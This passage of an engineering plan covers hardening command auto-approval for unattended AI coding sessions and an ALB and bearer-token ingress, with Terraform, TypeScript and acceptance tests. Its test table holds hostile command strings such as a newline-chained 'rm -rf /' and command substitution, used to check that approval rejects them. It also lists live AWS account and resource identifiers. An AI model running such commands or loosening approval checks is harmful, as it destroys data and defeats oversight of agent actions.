| `it('does not auto-approve command substitution')` | `'echo $(whoami)'`, `` 'echo `whoami`' `` | `false` for both |
| `it('does not auto-approve process substitution')` | `'diff <(ls) <(ls -a)'` | `false` |
| `it('does not auto-approve a newline-separated compound')` | `'git status\nrm -rf /'` | `false` |
| `it('still splits on && and ; as before')` | `'git status && git log'` | `true`; `'git status && rm -rf /'` → `false` |

**Acceptance:** the SDK's own test command passes (find it in `sherpa-sdk/package.json` / `packages/core/package.json`).

**This does not need to be released to unblock anything in Part 1.** It rides the next SDK publish, which §A.8 schedules anyway.

**Commit (in `sherpa-sdk`):** `fix: split auto-approve on single pipe and reject command substitution`

### Task 0.9 — record the blanket-auto-approve posture in the runbook

**Files:** wherever the runtime's operational notes live — check `docs/` in `command-center` and `nevado-sherpa-tui/docs/` (`runtime-api.md`, `RUNTIME_API.md` and `AWS_DEPLOYMENT.md` all exist there) and pick the one an on-call engineer would actually open (MOD or NEW).

**Why this is a task and not a footnote:** architecture doc **R2** is *"someone will cite `autoApprovedCommands` as evidence the runtime is sandboxed"*, and documentation is its only mitigation. A risk whose sole mitigation is never written down is unmitigated.

**What to write, in substance:**

- SDLC sessions run **unattended with blanket command auto-approval** (`autoApproveAllCommands: true`).
- The default `autoApprovedCommands` allowlist is **not a security control**: it already permits `node `, `python `, `aws `, `curl `, `make`, `npx `, `go `, `sed ` (`auto-approve.ts:8-24`), and `matchesPattern` is a prefix test (`:33`). An allowlist that must permit `npm run <anything>` and `make` cannot also prevent arbitrary execution — `package.json` scripts are arbitrary code.
- **Isolation lives at the host layer**, and today that layer is thin: one process holds the GitHub App token, the KB bucket, the session bucket and an instance role with `bedrock:InvokeModel` on `*` (`sherpa-ec2.tf:184-192`) and `secretsmanager:GetSecretValue` on the GitHub App private key (`:233-238`). Every session shares them.
- **Any session on the runtime can push to any repository the GitHub App installation covers.** That is already true for human sessions; machine sessions do not change the blast radius, but they change how often an unattended process exercises it.
- The control that would actually matter is per-session OS isolation, which is tracked against the Fargate migration, not against this work.

**Tests first:** none. **Not TDD — verified by** a human reading it. Get it reviewed by whoever owns the runtime; that review is the acceptance check.

**Commit:** `docs: record SDLC session auto-approval posture and its limits`

### Phase 0 exit criteria

1. `npm run test:backend` passes, including the new `cycleActivities.test.js` and `cycleProgressContract.test.js`.
2. `npm run build:frontend` succeeds and `npm run lint:frontend` shows **no new findings** versus the `develop` baseline. **Both lint scripts fail on clean `develop`** (§0.2), so a bare "lint passes" gate is unsatisfiable.
3. `grep -rn "codingAgentAdapter\|technicalApproach\|activityLog" backend/ frontend/` returns nothing. **`planningReviewData` must still be present** — Task 0.6 pins it rather than deleting it (§0.7), and criterion 8 asserts it.
4. `grep -rn "'agent'" backend/lambda_handlers/agentDrivenOrchestrator/runtimeDispatch.js` returns nothing.
5. **Neither fallback chain survives.** `grep -rn "progressLog ||\|activities ||" backend/ frontend/` returns nothing — both the JSX and `progressTracker.js:190` go through `selectActivities`.
6. **A cycle with only legacy `activities` renders a non-empty feed, and a cycle with only `progressLog` renders a non-empty feed.** Covered by `cycleActivities.test.js` as unit tests; confirm criterion 7 by eye on whichever kind of cycle is available.
7. A live cycle's UI shows a non-empty activity feed, a non-empty elapsed time, and — on an iterating cycle — the iteration bar. **Verified by eye, once.** This is the criterion that matters; the others are its preconditions.
8. **Both plan-review surfaces are reachable and neither renders a blank approach panel** (§0.7, Task 0.6). `grep -c "onReviewPlan={setPlanningReviewData}" frontend/src/pages/ApplicationDetail.jsx` returns `1`, and `cycleProgressContract.test.js`'s reachability guard passes. **This criterion exists because revision 3 nearly deleted one of those surfaces** — if the uncommitted frontend diff is rebased away, this fails, and that is the signal to revisit Task 0.6's contingency rather than to weaken the test.
9. `aws logs tail /aws/ec2/testing-sherpa-runtime --profile testing-tooling --since 10m` returns runtime log lines.

**Rollback:** Tasks 0.1–0.6 and 0.9 are pure code and revert cleanly with no live-state implications. Task 0.5 is the one to watch: it touches a **shared** selector used by both the frontend and `progressTracker`, so a revert must take all three call sites together or one of them loses its import. Task 0.7 touches live infrastructure — see its own rollback note. Task 0.8 is in a different repo and reverts independently.


## Phase 1 — prove the auth path against the live runtime

**Rewritten in revision 6 against the token ingress.** The earlier version of this phase built an mTLS listener on 8443 behind a hand-generated CA, and every task below is changed by that going away: **there is no CA ceremony, no trust store, no S3 bundle, no second listener, no security-group change, no leaf-expiry alarm, and no TLS-handshake negative to run.** What survives is the shape of the phase — establish the credential, prove the path, change nothing on the human surface — and the priority-8 deny, which was always the security-relevant half.

**This phase is empirical in intent.** The runtime and its ALB are live in testing (verified 2026-09-23: ALB `testing-sherpa-alb`, `active`, internet-facing; instance `i-0d5271e1ce5ea4fb0` named `testing-sherpa-runtime` at `10.16.2.183` in `vpc-02482e2c1d40e003b`). The auth question is a curl, not a design argument.

**⚠ Nothing in this phase has been verified running against AWS.** `sdlc_ingress_mode` defaults to `"none"`, so none of the ingress resources exist in any account until a human dispatches an apply with the mode set. The negatives below are the acceptance procedure, **not** a record of results.

**Ordering principle: the runtime's half must be on the instance before the ALB rule admits anything to it.** This is the one ordering that matters and Terraform cannot enforce it — it can see neither the other repository nor the running instance. Tasks run 1.6 (runtime namespace + ACL, manual SSM deploy) → 1.4 (Terraform, mode `token`) → 1.5 → 1.7. **Phase 1 is four tasks**, not seven — §0.9.1 deleted the API Gateway front door and with it Tasks 1.1, 1.2, 1.2b and 1.3.

**AWS profile for every command in this phase: `testing-tooling`.** Region `us-east-1`. Account `946774551778`. Verified working: `aws sts get-caller-identity --profile testing-tooling` returns `arn:aws:sts::946774551778:assumed-role/AWSReservedSSO_Administrator_561651e12e6a6558/jeff`.

Constants you will need, all verified live on 2026-09-23:

| | |
|---|---|
| ALB | `testing-sherpa-alb-1426385821.us-east-1.elb.amazonaws.com`. **One** HTTPS listener (`aws_lb_listener.sherpa_https`, `sherpa-ec2.tf:542`) on **443**, default action `authenticate-cognito` (`OnUnauthenticatedRequest: authenticate`) then `forward` to `testing-sherpa-tg`. **It stays the only listener** — the token path answers on it |
| ALB rules in use | priority **10** (`/v1/workspace/auth`, `redirect` + `authenticate-cognito`), priority **20** (`/v1/workspace/*`, `authenticate-cognito` + `forward`). Priorities **5–8 are free** on :443 |
| Rule priorities this phase adds | **6** = forward `/v1/sdlc/*` when `Authorization: Bearer *` is present; **8** = unconditional 403 on the same paths. 5 and 7 are reserved for the inactive mTLS and header variants so a live priority is never ambiguous about which rule it belongs to |
| Target group | `aws_lb_target_group.sherpa` (`sherpa-ec2.tf:505`). **Unchanged, and shared with the human surface** — which is why the prefix and the Fastify hook, not the ALB, are what separate the namespaces |
| ALB security group | `sg-0cb49292df9f5504e` — ingress **443 only**, from `0.0.0.0/0`. **Unchanged by this phase.** The old 8443 rule is gone with the listener |
| Instance security group | `sg-0d968534a4a9814dd` — port **3000 only**, sourced **only** from `sg-0cb49292df9f5504e`, **no CIDRs**. Verified live, and **unchanged** |
| Runtime port | 3000; `GET /health` is at the **root**, and a second one is served **inside** the `/v1/sdlc` encapsulation |
| Hostname / certificate | `sherpa.<customer_subdomain>` with `var.acm_certificate_arn`. **Untouched** — no new listener, so no certificate or DNS work of any kind |

**No longer relevant to this phase**, and listed so nobody goes looking: the Cognito user pool, its token endpoint, HTTP API `rs95ir4q63`, JWT authorizer `asmmq1`, the `commandcenter` resource server and its scopes. §0.4 BQ1 retains the M2M evidence as a platform fact.

### Tasks 1.1, 1.2, 1.2b, 1.3 — DELETED (ingress Option C)

**All four existed only to serve an API Gateway front door that §0.9.1 removed.** Recorded rather than silently dropped, because someone will look for them:

| Was | Fate |
|---|---|
| **1.1** mint an M2M client via `POST /v1/api-credentials` | Deleted. No M2M client in this design |
| **1.2** the `client_credentials` token probe (BQ1 / architecture doc U1) | Deleted. **The probe was run and passed on 2026-09-24** — §0.4 keeps the evidence as a platform fact, useful to whoever next needs M2M auth. It is not load-bearing here |
| **1.2b** fix the machine-token classifier | Deleted — **no consumer.** With no M2M client, no machine token is ever issued on this path. **The defect is real and stands: file it separately** (§0.9.1 has the evidence and the 22 affected `GetUserID` call sites) |
| **1.3** API Gateway route + `HTTP_PROXY` integration + parameter mapping | Deleted. This would have been the repo's first `HTTP_PROXY` integration; it is no longer needed |

**What replaces the ingress work: Tasks 1.4 (the token secret and the two ALB listener rules), 1.5 (deploy targets) and 1.6 (the `/v1/sdlc` namespace and its ACL hook).** That is the whole of Phase 1 now.

**The credential is the boundary, and the runtime is what checks it.** Previously there were two doors and either sufficed alone; §0.9.1 explains why that bought nothing. **Task 1.4's priority-8 deny is the security-relevant half of that task**, and for a reason earlier drafts got wrong: the :443 default action is `authenticate-cognito` **plus `forward`**, so without it an already-authenticated human browser reaches the machine namespace — a successful request, not a redirect. **Task 1.4's priority-6 forward is not a control at all** — it is a reachability filter, and reading it as the gate is the one way to misread this phase.

### Task 1.4 — the token secret, the priority-6 forward, and the unconditional 443 deny

**Files:**
- `infrastructure/sherpa-sdlc-ingress.tf` (NEW — the mode variable, the generated token, the secret and its version, the forward rule, the deny rule, and the two outputs. A file of its own rather than more of `sherpa-ec2.tf`, because the whole of the machine ingress belongs in one place a reader can audit)
- `.github/workflows/deploy-dev.yml` (MOD — but read Task 1.5's note first; **these resources are `count = 0` on internal**)

**Not TDD — verified by** `terraform plan` plus Task 1.7's negatives. Do not write a test that greps the `.tf`; the plan is the check.

#### Step 1 — ~~the CA, by hand, once~~ DELETED

**There is no CA, no leaf, no S3 bundle, no trust store, no hand-populated secret and no expiry alarm.** The whole of this step is gone, and §0.9.1 records why at length — including the part that matters most if anyone reopens it: **mTLS was declined on cost, not on feasibility.** A root CA and a client leaf are both creatable and signable **entirely in Terraform** with no manual step (AWS Private CA, or the `tls` provider for free). **Do not reintroduce an `openssl` ceremony, and do not record that one was necessary.**

**Terraform generates and writes the credential itself, in the same apply**, which is the property that removed this step:

- `random_password.sdlc_auth_token` — **48 characters, `special = false`** (the token travels in a header value and is compared by two independent implementations; excluding punctuation removes every quoting, shell-escaping and header-encoding question, and the length recovers the entropy).
- `aws_secretsmanager_secret.sdlc_auth_token` — `"${var.project_name}/sdlc-auth-token/${var.environment}"`, **`recovery_window_in_days = 0`**. Stated because the default is 30 days of an unusable name: re-applying the same mode after a destroy would fail with *"a secret with this name is scheduled for deletion"* for a month, turning a mode switch into an outage.
- `aws_secretsmanager_secret_version.sdlc_auth_token` — `sensitive(jsonencode({ token = … }))`. **`{"token": "<opaque string>"}` is a cross-repository contract**; `jsonencode` rather than a heredoc so a token containing an escapable character cannot produce a secret that parses on neither side.

**The token is in Terraform state in clear text.** That is a real trade and §0.9.1 argues it: state access in this repo is already privileged. What it is **not** is the header variant — rotation here is a Secrets Manager write or a `terraform taint`, and the value never appears in a plan output or a workflow log.

#### Step 2 — Terraform: the mode, the forward, the deny

**Everything is behind `var.sdlc_ingress_mode`, defaulting to `"none"`** with a `validation` block over `["none", "mtls", "header", "token"]`. **The default is load-bearing, not conservatism:** every merge to `develop` runs `deploy-testing.yml`, which dispatches `deploy-customer-instance.yml` against the live testing account with a **full untargeted apply**. Anything defaulted on here reaches a live ALB without a human choosing to apply it.

Each mode's locals gate on `local.enable_sherpa_alb` (`sherpa-ec2.tf:416`) **as well as** the mode, because every rule indexes into `aws_lb_listener.sherpa_https[0]` or `aws_lb_target_group.sherpa[0]`. **Gate the secret on it too**, even though a Secrets Manager secret needs no ALB — so that a mode set in an environment with no runtime creates nothing rather than a secret pointing at an ingress that does not exist, and so the dispatching Lambdas' derived values stay `""` together and take their one legible refusing arm instead of dialling a host that is not there.

```hcl
# THIS RULE DECIDES WHO CAN REACH THE VERIFIER. IT DOES NOT DECIDE WHO IS
# AUTHORISED. The runtime reads the same secret this file writes, hashes the
# presented token and the expected one, and compares them in constant time.
# Delete both conditions below and no unauthorised request becomes authorised.
#
# Priority 6, which must be BELOW the deny at 8 in number so it is evaluated
# FIRST. An allow at 9 or 10 is never reached: the deny matches the same paths
# with no further condition, so every machine request would 403 from a rule that
# looks correct in the console.
resource "aws_lb_listener_rule" "sherpa_sdlc_token_forward" {
  count        = local.sdlc_ingress_token ? 1 : 0
  provider     = aws.sherpa_runtime
  listener_arn = aws_lb_listener.sherpa_https[0].arn
  priority     = 6

  condition {
    path_pattern {
      # BOTH FORMS. An ALB path pattern is a literal match with `*` as a
      # wilddcard, so "/v1/sdlc/*" does NOT match exactly "/v1/sdlc". Omitting
      # the bare form here means a 403 on one path and success on every other.
      values = ["/v1/sdlc", "/v1/sdlc/*"]
    }
  }

  condition {
    http_header {
      # A REACHABILITY FILTER, NOT THE AUTHENTICATOR. What it buys: a request
      # carrying no Authorization header at all — every browser request, and
      # therefore the entire class the deny at 8 was written for — no longer
      # matches this rule and is refused before it touches the instance.
      #
      # The header NAME matches case-insensitively (so HTTP/2's lowercasing is
      # fine) while the VALUE is case-sensitive, which is why the scheme is
      # spelled exactly as the Go client spells it: "bearer *" matches nothing.
      http_header_name = "Authorization"
      values           = ["Bearer *"]
    }
  }

  action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.sherpa[0].arn
  }
}
```

Copy the `count`/`provider`/`listener_arn` idiom from the existing rules at `sherpa-ec2.tf:578-617` (priority 10) and `:619-650` (priority 20) — both gate on `local.enable_sherpa_alb` and use `provider = aws.sherpa_runtime`.

**Record the priority table in the file**, because the next reader should not have to reconstruct it. A **lower** number is evaluated **first**:

| Listener | Priority | Mode | Action |
|---|---|---|---|
| :8443 | 5 | `mtls` (inactive) | forward `/v1/sdlc/*` to the target group |
| :443 | **6** | **`token` (operated)** | forward `/v1/sdlc/*` when `Authorization: Bearer *` is present |
| :443 | 7 | `header` (inactive) | forward `/v1/sdlc/*` when the secret header matches |
| :443 | **8** | **ALL MODES** | **deny `/v1/sdlc/*` with a 403** |
| :443 | 10 | existing | `/v1/workspace/auth` |
| :443 | 20 | existing | `/v1/workspace/*` |

**6 and 7 are distinct numbers even though the two variants never coexist.** Reusing 7 would work today and would make a mode switch an edit to one rule's conditions rather than a destroy-and-create — but it would also mean the first apply after someone made the modes non-exclusive by mistake fails with a duplicate-priority error **from the ALB** rather than at plan time, and it makes the table ambiguous about which rule a live priority 7 belongs to. Distinct numbers cost nothing: the listener has 50 slots and uses four.

#### Step 3 — the 443 deny is unconditional, and gated on the ALB rather than the mode

**This is the strengthening revision 6 makes to the old "rule 6".** Same 403, same paths, three differences that all matter.

Verified live: the 443 listener's default action is `authenticate-cognito` **followed by `forward`**, and rules 10/20 match only `/v1/workspace/*`. So `https://sherpa.<subdomain>/v1/sdlc/health` falls through to the default and **an already-authenticated human browser is forwarded into the machine namespace.** Not a redirect — a successful request, into a surface that can create a session holding a live GitHub push credential under blanket auto-approval.

```hcl
# GATED ON THE ALB, NOT ON THE MODE. The hole belongs to the :443 listener, so it
# exists in "none" mode too — the moment the runtime starts serving /v1/sdlc/*
# (a separate, manual deploy), a browser could reach it whether or not an ingress
# variant is active. Denying unconditionally also means mode switches never
# create or destroy this rule, so there is no window during a switch in which the
# namespace is open, and none of the apply-ordering care a two-rule version needs.
#
# It only ever denies, so it is safe to land ahead of any decision about mode.
resource "aws_lb_listener_rule" "sherpa_sdlc_deny_443" {
  count        = local.enable_sherpa_alb ? 1 : 0
  provider     = aws.sherpa_runtime
  listener_arn = aws_lb_listener.sherpa_https[0].arn
  priority     = 8

  condition { path_pattern { values = ["/v1/sdlc", "/v1/sdlc/*"] } }

  action {
    type = "fixed-response"
    fixed_response {
      content_type = "application/json"
      message_body = jsonencode({ error = "forbidden" })
      status_code  = "403"
    }
  }
}
```

1. **Priority 8, not 6** — it must be evaluated **after** every forward, or it swallows the authorized request and no variant can work.
2. **Unconditional and mode-independent**, so it exists in all four modes including `"none"`, and a mode switch never opens a window.
3. **It still does its job in `token` mode.** The forward at 6 is evaluated first but matches only a request carrying a bearer-shaped `Authorization` header — so a browser, which sends none, falls through to this 403 exactly as in every other mode. **What reaches the runtime in token mode is traffic shaped like a machine call, and the runtime decides whether it is authorised.**

#### Acceptance

```
cd infrastructure && terraform plan -var="sdlc_ingress_mode=token" \
  -target=random_password.sdlc_auth_token \
  -target=aws_secretsmanager_secret.sdlc_auth_token \
  -target=aws_secretsmanager_secret_version.sdlc_auth_token \
  -target=aws_lb_listener_rule.sherpa_sdlc_token_forward \
  -target=aws_lb_listener_rule.sherpa_sdlc_deny_443
```

**Do NOT assert "N to add, 0 to change, 0 to destroy".** An earlier revision of this task did, and treated anything in the change column as proof the human path had been touched. **That assertion cannot hold, and the reason is not a defect** — it was a property of the mTLS variant: `aws_security_group.sherpa_alb` declares its ingress **inline**, so an 8443 rule must be a dynamic inline block there rather than a standalone `aws_security_group_rule` (Terraform owns that group's complete ingress set and would revoke a separately-managed rule on the next apply), and the group therefore legitimately shows as a **change**. The token variant touches no security group at all, so the column should in fact be clean — but **assert the four things that actually matter, not the summary line**:

```
NO change to aws_lb_listener.sherpa_https
NO change to aws_lb_listener_rule.sherpa_workspace_auth   (priority 10)
NO change to aws_lb_listener_rule.sherpa_workspace_api    (priority 20)
NO change to aws_lb_target_group.sherpa
```

Those four are the human surface. **Do not "fix" a security group back to a standalone rule to make an old summary assertion pass** — that trades a correct plan for an apply that quietly revokes the rule every time it runs.

After apply:
```
aws elbv2 describe-listeners --profile testing-tooling --region us-east-1 \
  --load-balancer-arn $(aws elbv2 describe-load-balancers --profile testing-tooling \
     --names testing-sherpa-alb --query 'LoadBalancers[0].LoadBalancerArn' --output text) \
  --query 'Listeners[].{Port:Port,MTLS:MutualAuthentication.Mode}'
```
Expected: **exactly one listener — `443` with `MTLS: "off"`.** A second listener on 8443 means the wrong mode was applied. `443` reporting anything but `"off"` means the human surface has been given mutual authentication, which breaks every browser.

```
aws ec2 describe-security-groups --profile testing-tooling --region us-east-1 \
  --group-ids sg-0d968534a4a9814dd \
  --query 'SecurityGroups[0].IpPermissions[?FromPort==`3000`]'
```
Expected: **unchanged** — port 3000 reachable only from `sg-0cb49292df9f5504e`, no CIDRs. Nothing in this task touches it; re-assert it after the apply rather than trusting it.

Behavioural checks are Task 1.7's negatives.

#### Rollback

These attach to a **live** ALB serving the human workspace UI, and every resource is **additive**: two rules at unused priorities, one secret. **Nothing existing is modified**, which is what makes this safe to apply during the day.

`terraform destroy` on the targets, or `aws elbv2 delete-rule` on the priority-6 forward in an emergency — which closes the machine path immediately and leaves the deny in place. **Apply order matters in exactly one direction: the deny at 8 can and should land first**, because it only ever denies. Landing the forward first leaves a window in which a request shaped like a machine call reaches a runtime that may not yet be able to check it.

**⚠ And that is the real ordering constraint for this whole phase: apply the mode only after Task 1.6's build is on the instance** — not merely merged. If the box is not running a build carrying the ACL's token check, "shaped like a machine call" is the only test any request faces. Terraform cannot see the other repository or the running instance, so the mode defaults off and turning it on is a `workflow_dispatch` a human performs. **That is where the ordering is enforced, and nowhere else.**

**Commit:** `feat: add a token SDLC ingress mode with a Terraform-generated bearer credential`

### Task 1.5 — add every new resource to the deploy target list

**Files:** `.github/workflows/deploy-dev.yml` (MOD).

**Same PR as the resource, every time.** This is a project rule and §0.3 explains why it is now harder to catch: Phases 1–3 are validated in *testing*, which gets a **full untargeted apply** through `deploy-customer-instance.yml`, so a missing `-target=` entry will not fail any exit criterion in this document. It will fail silently, later, on internal.

**Where exactly.** `deploy-dev.yml` has **three** targeted apply steps, not one:

| Step | `name:` line | `apply` line | `-target=` range | `-var=` range |
|---|---|---|---|---|
| Terraform Apply: Core | 419 | 426 | **427–586** | 587–615 |
| Terraform Apply: DevOps Phase 1 | 645 | 652 | 653–791 | 792–821 |
| Terraform Apply: DevOps Phase 2-4 | 822 | 829 | 830–956 | 957–985 |

Targets are **one `-target="<address>" \` flag per line, literal, inline in the `run:` block** — no bash array, no variable, no file. 426 flags total.

#### Under the token ingress, this task adds **nothing** — and that is the finding, not an omission

**Every resource Task 1.4 creates is gated on `local.enable_sherpa_alb`, which is `false` on internal — the token secret included, deliberately.** So none may be added to `deploy-dev.yml`'s target list: **a `-target` for a resource whose `count` is 0 fails the apply.**

Verified: `deploy-dev.yml` has **zero** matches for `aws_instance.sherpa_runtime`, `sherpa_alb`, `aws_lb.`, `sherpa_kb` or `enable_sherpa_runtime`. The only "sherpa" targets there (`:561-581`) are the **Lambda**-based Sherpa from `sherpa.tf`/`lambdas.tf` (`sherpa_agent`, `sherpa_slack`, `sherpa_chat`, `sherpa_config`) — unrelated to the EC2 runtime. Internal never sets `enable_sherpa_runtime`, so it stays at the `false` default (`sherpa-ec2.tf:58`).

**The earlier revision's two entries are gone with Task 1.3** — they were the API Gateway integration and route, which no longer exist.

| Task 1.4 resource | `-target` entry? |
|---|---|
| `random_password.sdlc_auth_token` | **No** — `count = 0` on internal |
| `aws_secretsmanager_secret.sdlc_auth_token` | **No** — same. **Gated on the ALB on purpose**, even though a secret needs none: a mode set where there is no runtime must create nothing, not a secret pointing at an ingress that does not exist |
| `aws_secretsmanager_secret_version.sdlc_auth_token` | **No** — same |
| `aws_lb_listener_rule.sherpa_sdlc_token_forward` | **No** — same |
| `aws_lb_listener_rule.sherpa_sdlc_deny_443` | **No** — same |
| Task 1.7's IAM edit to `aws_iam_role_policy.lambda_policy` | **Already targeted** at `deploy-dev.yml:428` |

**So Phase 1 adds no target-list entries at all.** These resources reach testing through the **full untargeted apply** in `deploy-customer-instance.yml` (§0.3), which is the only workflow that deploys the account where the runtime exists — and which is also why `sdlc_ingress_mode` defaults to `"none"`.

**Say this explicitly in the PR description.** The project rule is "new `.tf` resources go in the target list in the same PR", and a reviewer applying it mechanically will ask why five new resources have no entries. The answer — `count = 0` on the only environment that list governs — is correct but not obvious, and leaving it unstated invites someone to "fix" it and break the apply.

**Where entries WILL be needed: Phase 3.** The FIFO queue, DLQ, alarm, event source mapping and the Go consumer Lambda are all unconditional and all live on internal. Task 3.8 owns those.

**Tests first:** none. **Not TDD — verified by:**
```
grep -c 'target=' .github/workflows/deploy-dev.yml
```
Expected: **426, unchanged.** A different number means something was added that should not have been.

**Acceptance:** the next `deploy-dev` run's "Terraform Apply: Core" step succeeds and mentions none of the five resources. **A failure naming `count = 0` or "resource not found" means an entry was added anyway** — remove it.

**Commit:** none. This task produces no diff; fold its PR-description note into Task 1.4's commit.

### Task 1.6 — add the `/v1/sdlc` namespace, a health endpoint, and the token verifier

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/config.ts` (MOD — add `SDLC_PREFIX`, `sdlcAuthTokenArn`, `sdlcAllowedClientCns`)
- `apps/runtime/src/sdlc/auth-token.ts` (NEW — the boot secret read and the constant-time verifier)
- `apps/runtime/src/sdlc/auth-token.test.ts` (NEW)
- `apps/runtime/src/routes/sdlc.ts` (NEW)
- `apps/runtime/src/routes/sdlc.test.ts` (NEW)
- `apps/runtime/src/index.ts` (MOD — load the verifier, register the plugin)
- `apps/runtime/src/routes/sdlc-prefix.integration.test.ts` (NEW — the encapsulation proof)

**⚠ Revision 6 moves the ACL hook INTO this task.** The earlier version deferred it to Phase 2 Task 2.4 and left an unauthenticated health endpoint for Phase 1's negatives to hit. **That was correct under mTLS, where the ALB refused an uncredentialed request itself, and it is wrong under the token, where the runtime IS the authenticator.** Shipping the namespace without the hook publishes a machine surface whose only gate is an ALB rule that checks the *shape* of a header. **The hook and the namespace land together, in one deploy.**

**This is the first change to the runtime repo, and its deploy path is a manual SSM RunCommand, not a pipeline.** Phases 1, 2 and 3 all depend on it. See the deploy note below and schedule it early — §0.3 flags this as the largest schedule risk in Part 1, and it is not a technical one.

**Implementation.**

Add to `config.ts`, beside the existing `export const API_PREFIX = '/v1/workspace';` (`:1`):

```ts
export const SDLC_PREFIX = '/v1/sdlc';
```

Create `apps/runtime/src/routes/sdlc.ts`. **Take a dependency STRUCT, not positional parameters** — by Phase 2 this route needs the session manager, the worker, the workspace manager, the broadcaster, the config, the GitHub token manager, the pty manager, the start time and the bearer verifier, and eight positional parameters is worse than a named field each:

```ts
export interface SdlcRouteDeps {
  readonly manager: SessionManager;
  readonly worker: AgentWorker;
  readonly workspaceManager: WorkspaceManager;
  readonly broadcaster: Broadcaster;
  readonly config: RuntimeConfig;
  /**
   * NOT optional, unlike `registerSessionRoutes`. An SDLC session exists to commit and push; a
   * route that cannot acquire a credential is not degraded, it is broken. The human route's
   * optionality is precisely the silent-failure mode this refusal closes — a session with no
   * credential fails only when the agent pushes, after all the work is done.
   */
  readonly tokenManager: GitHubTokenManager;
  readonly ptyManager: PtyManager;
  readonly startTime: number;
  /** The boot-read bearer credential, or absent. Absent ⇒ the token path does not exist. */
  readonly bearerVerifier?: SdlcBearerVerifier;
}

export function registerSdlcRoutes(app: FastifyInstance, deps: SdlcRouteDeps): void {
  // A runtime guard, not merely a type: `index.ts` builds the token manager conditionally on
  // three env vars, so "absent" is a real configuration state, and refusing here is what turns
  // it into a startup failure instead of a session that cannot push.
  if (!deps.tokenManager) {
    throw new Error('registerSdlcRoutes requires a tokenManager — an SDLC session exists to commit and push');
  }

  app.addHook('preHandler', /* §A.3's ACL hook */);

  app.get<{ Reply: HealthResponse }>('/health', async () => ({
    status: 'ok',
    activeSessions: deps.worker.activeCount,
    queuedSessions: deps.worker.queuedCount,
    activePtySessions: deps.ptyManager.activeCount,
    uptime: Math.floor((Date.now() - deps.startTime) / 1000),
  }));
}
```

`HealthResponse` is `{status: 'ok', activeSessions, queuedSessions, activePtySessions?, uptime}` (`protocol/src/api.ts:54-60`) — **note the fifth field the architecture doc omits** (§0.1.a C10). Return the existing shape and nothing else; do not invent an SDLC-specific health payload.

Register it in `index.ts` immediately after the `workspaceRoutes` block (`:112-121`):

```ts
// The verifier is read ONCE, here, at boot — see `sdlc/auth-token.ts` for why not per request.
// A read that THROWS must take the plugin out of the registration, not degrade it.
const bearerVerifier = config.sdlcAuthTokenArn
  ? await loadSdlcBearerVerifier(config)
  : undefined;

await app.register(async function sdlcRoutes(instance) {
  registerSdlcRoutes(instance, { manager, worker, workspaceManager, broadcaster, config,
                                 tokenManager, ptyManager, startTime, bearerVerifier });
}, { prefix: SDLC_PREFIX });
```

**This is also where Phase 3's publisher is wired**, and it belongs in one place with the registration because both are boot-time observations of the same session store:

```ts
broadcaster.setObserver((sessionId, message) => sdlcPublisher.observe(sessionId, message));
```

**`await` it**, unlike the existing `workspaceRoutes` register — Fastify defers plugin boot to `listen()` either way, but awaiting is the correct shape and the existing omission is an inconsistency, not a pattern to copy.

**Add a `setNotFoundHandler` inside the encapsulation** so that a typo under `/v1/sdlc/*` returns the `{error}` envelope rather than Fastify's default `{message, error, statusCode}` (§A.2.5). Cheap, and it removes a whole class of confusing Phase 2 debugging. CC must still not depend on it.

**Add the ACL hook in THIS task** (see the ⚠ above; §A.3 is normative for it). Two details of its shape belong here rather than in Phase 2, because getting them wrong is what makes the endpoint reachable without a credential:

- **`/health` is deliberately exempt, and the exemption must match the PATH, not `req.url`.** `req.url` is the raw request target and carries the query string, so `endsWith('/health')` on it is wrong in both directions: `?x=/health` on **any** route satisfies the exemption and skips the credential check — and on `POST /sessions`, which has no `:id` for anything downstream to re-check, **that creates a session** — while a legitimate `/health?probe=1` is rejected. Strip the query first.
- **Absent verifier ≠ a check that can never pass.** `SDLC_AUTH_TOKEN_ARN` unset means the token path **does not exist** (a deployment may be certificate-only). A read that **fails** is different: `index.ts` must **decline to register the plugin at all** rather than serve it with a comparison nothing can satisfy. Collapse the two and a misconfigured ARN becomes a silently unreachable surface instead of a startup failure.

Keeping `/health` open is what makes N5 meaningful: it proves the rule and the target group work. **N5b, on a non-health route, is what proves the hook works** — and the two must not be conflated, because `/health` returning `200` says nothing about whether any token was checked.

**Tests first.** Runner is `node:test` over compiled `dist/` (§0.2 runtime conventions). Copy the harness from `apps/runtime/src/routes/sessions.test.ts:109-124` and the doubles from `apps/runtime/src/routes/test-fixtures.ts` (`createMockWorker`, `mockConfig`).

`apps/runtime/src/routes/sdlc.test.ts`:

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('serves health with the protocol HealthResponse shape')` | `makeApp()` registering `registerSdlcRoutes` bare (no prefix — the prefix lives in `index.ts`), `createMockWorker({activeCount: 2, queuedCount: 1})` | `inject({method:'GET', url:'/health'})` → `200`; body has exactly the keys `status`, `activeSessions`, `queuedSessions`, `activePtySessions`, `uptime`; `status === 'ok'`; `activeSessions === 2`; `queuedSessions === 1` |
| `it('returns the error envelope for an unknown path, not Fastify default')` | same | `inject({url:'/nonexistent'})` → `404` and the body has an `error` key and **no** `statusCode` key. This is the `setNotFoundHandler` assertion — and it fails loudly if someone removes the handler later |

Plus, in `index.ts`'s own coverage or a small integration test, the fact that matters most and is easiest to get wrong:

| Test name (sentence) | Assertion |
|---|---|
| `it('registers the SDLC routes under /v1/sdlc, not /v1/workspace')` | boot the real app (integration test — name it `sdlc-prefix.integration.test.ts`); `GET /v1/sdlc/health` → `200`; `GET /v1/workspace/health` → `404`; `GET /health` → `200` (the root one, unchanged) |

That last test is the one that catches the mistake the architecture doc's "the path name is the only SDLC-aware string in the runtime" invites: putting the routes in the wrong encapsulation.

**Acceptance:**
```
cd <your nevado-sherpa-tui checkout> && pnpm build && pnpm --filter @nevado/runtime test
```
Expected: all suites pass. **`pnpm build` first is not optional** — tests run against `dist/`, so an uncompiled `.test.ts` runs nothing and still exits 0 (§0.2).

Then locally:
```
curl -sS localhost:3000/v1/sdlc/health
```
Expected: `{"status":"ok","activeSessions":0,"queuedSessions":0,"activePtySessions":0,"uptime":N}`

